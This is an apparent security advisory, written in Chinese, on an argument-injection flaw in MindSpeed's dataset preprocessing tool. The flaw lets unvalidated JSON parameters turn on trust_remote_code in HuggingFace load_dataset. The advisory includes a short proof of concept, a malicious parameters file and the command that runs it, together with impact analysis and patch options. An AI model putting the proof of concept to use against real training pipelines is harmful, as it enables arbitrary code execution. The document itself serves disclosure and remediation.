# VULN-tools-load_dataset-001：load_dataset函数参数注入致trust_remote_code代码执行

## 概要

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-tools-load_dataset-001 |
| **类型** | 参数注入 (CWE-88) |
| **严重性** | High |
| **CVSS评分** | 7.8 (High) |
| **受影响文件** | `tools/data_handler.py`, `tools/preprocess_data.py` |
| **受影响函数** | `build_dataset()` |
| **代码行号** | `tools/data_handler.py:510-513` |

## 漏洞描述

不可信的命令行参数 `--hf-datasets-params` 从用户指定文件加载为 JSON，并直接传递给 `load_dataset(**param_dict)` 而无任何验证或过滤。这允许攻击者注入任意参数，包括 `trust_remote_code=True`，在加载恶意 HuggingFace 数据集时可能导致远程代码执行。

## 漏洞代码

### tools/data_handler.py (第 510-513 行)
```python
if args.hf_datasets_params:
    with open(args.hf_datasets_params, 'r') as fin:
        param_dict = json.load(fin)
    return load_dataset(**param_dict)  # 无 param_dict 验证
```

### tools/preprocess_data.py (第 93-94 行)
```python
group.add_argument('--hf-datasets-params', default=None,
                   help='huggingface load_dataset params')
```

### tools/preprocess_data.py (第 172-179 行)
```python
def main():
    args = get_args()  # 解析命令行，包括 --hf-datasets-params
    # ...
    raw_data = build_dataset(args)  # 将不可信 args 传递给漏洞函数
```

## 数据流分析

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 入口点：tools/preprocess_data.py - main()                                    │
│ 类型：cmdline (untrusted_local)                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ argv → argparse.parse_args() → args.hf_datasets_params                      │
│ (用户控制的文件路径)                                                          │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ json.load(fin) → param_dict (不可信 JSON 内容)                               │
│ 无键或值验证                                                                  │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 危险点：load_dataset(**param_dict)                                           │
│ 允许注入任意参数，包括 trust_remote_code=True                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 概念验证

### 步骤 1：创建恶意参数文件
```json
{
    "path": "malicious-user/poisoned-dataset",
    "trust_remote_code": true,
    "download_mode": "force_redownload"
}
```

### 步骤 2：执行攻击
```bash
python tools/preprocess_data.py \
    --hf-datasets-params malicious_params.json \
    --tokenizer-type PretrainedFromHF \
    --tokenizer-name-or-path gpt2 \
    --output-prefix output
```

### 攻击结果
当设置 `trust_remote_code=True` 时，HuggingFace `datasets` 库将：
1. 从远程仓库下载数据集的自定义加载脚本
2. 以完整 Python 权限执行该脚本
3. 控制数据集仓库的攻击者可执行任意代码

## 影响评估

### 机密性：HIGH
- 攻击者可读取系统任意文件
- 可窃取环境变量、密钥和凭证

### 完整性：HIGH
- 攻击者可修改或删除进程可访问的任意文件
- 可向训练管道注入恶意数据

### 可用性：HIGH
- 攻击者可导致系统崩溃或拒绝服务
- 可损坏数据集或训练输出

### 攻击向量：LOCAL
- 需要能传递命令行参数或修改 JSON 文件
- 社会工程可诱骗用户使用恶意参数文件

## 已知风险意识证据

项目在其他代码位置展现了对 `trust_remote_code` 风险的意识：

### mindspeed/tokenizer/tokenizer.py (第 75 行)
```python
hf_tokenizer_kwargs["trust_remote_code"] = False  # 显式禁用
```

### mindspeed/tokenizer/build_tokenizer/adaptor.py (第 58 行)
```python
hf_tokenizer_kwargs["trust_remote_code"] = False  # 显式禁用
```

### docs/zh/SECURITYNOTE.md (第 121 行)
> 如果trust_remote_code=True，下载的代码可能包含恶意逻辑或后门，威胁系统安全。

**然而，`tools/data_handler.py` 中的 `build_dataset()` 函数缺少此保护。**

## 根因分析

1. **缺少输入验证**：无 `load_dataset()` 参数的白名单或黑名单
2. **间接注入向量**：JSON 文件路径参数提供间接注入能力
3. **安全实践不一致**：tokenizer 代码应用了保护但数据集加载代码未应用
4. **信任边界违规**：用户提供的参数直接传递给敏感 API

## 修复建议

### 方案 1：参数白名单（推荐）
```python
ALLOWED_DATASET_PARAMS = {
    'path', 'name', 'data_dir', 'data_files', 'split',
    'cache_dir', 'features', 'download_mode', 'num_proc',
    'storage_options', 'verification_mode', 'keep_in_memory',
    'save_infos', 'revision', 'token', 'proxies'
}

def build_dataset(args):
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        
        # 安全：仅过滤允许的参数
        safe_params = {k: v for k, v in param_dict.items() 
                       if k in ALLOWED_DATASET_PARAMS}
        
        # 安全：绝不允许 trust_remote_code
        safe_params['trust_remote_code'] = False
        
        return load_dataset(**safe_params)
    # ... 函数其余部分
```

### 方案 2：显式参数处理
```python
def build_dataset(args):
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        
        # 记录可疑参数警告
        dangerous_params = {'trust_remote_code', 'script_version'}
        found_dangerous = set(param_dict.keys()) & dangerous_params
        if found_dangerous:
            logger.warning(f"安全：拒绝危险参数: {found_dangerous}")
        
        # 显式设置安全默认值
        param_dict['trust_remote_code'] = False
        
        return load_dataset(**param_dict)
    # ... 函数其余部分
```

### 方案 3：专用 CLI 参数（最安全）
用显式、单独的 CLI 参数替换 `--hf-datasets-params`：
```python
group.add_argument('--dataset-path', type=str, help='数据集路径或名称')
group.add_argument('--dataset-name', type=str, help='数据集配置名称')
group.add_argument('--dataset-split', type=str, default='train', help='数据集分割')
# ... 等
```

## 附加安全考虑

1. **输入文件验证**：验证 `args.hf_datasets_params` 指向合法位置
2. **JSON Schema 验证**：为参数文件实现 JSON schema 验证
3. **审计日志**：记录所有数据集加载参数用于安全监控
4. **文档更新**：更新 SECURITYNOTE.md 记录此参数注入风险

## 参考资料

- **CWE-88**：参数注入或修改
- **HuggingFace 文档**：[trust_remote_code 安全考虑](https://huggingface.co/docs/datasets/security)
- **相关 CVE**：类似模式在 ML 工具中已导致 CVE

## 验证状态

| 检查项 | 状态 |
|--------|------|
| 漏洞已确认 | ✅ 是 |
| 攻击向量有效 | ✅ 是 |
| 影响现实 | ✅ 是 |
| 修复方案已提供 | ✅ 是 |
| 与 CWE-88 一致 | ✅ 是 |

## 元数据

- **分析者**：details-worker
- **分析日期**：2026-04-20
- **项目**：MindSpeed
- **仓库**：/home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed